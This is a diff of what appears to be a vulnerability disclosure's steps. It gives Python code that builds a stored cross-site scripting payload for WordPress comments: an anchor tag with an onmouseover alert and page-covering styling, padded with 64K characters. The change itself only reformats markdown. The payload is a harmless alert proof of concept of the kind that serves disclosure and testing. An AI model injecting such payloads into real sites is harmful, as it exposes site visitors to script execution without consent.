@@ -34,12 +34,12 @@ Steps:
 3. Create the string using the following python code to generate a file:
 
 
-`out = "<a title='xonmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
-with open('xss.txt','a') as f:
-    f.write(out)
-    for i in range(64*1024):
-        f.write('X')
-    f.write("</a>")`
+`out = "<a` `title='xonmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px "`
+`with open('xss.txt','a') as f:`
+    `f.write(out)`
+    `for i in range(64*1024):`
+        `f.write('X')`
+    `f.write("</a>")`
 
 
 4. Use the string generated in a comment on WP.
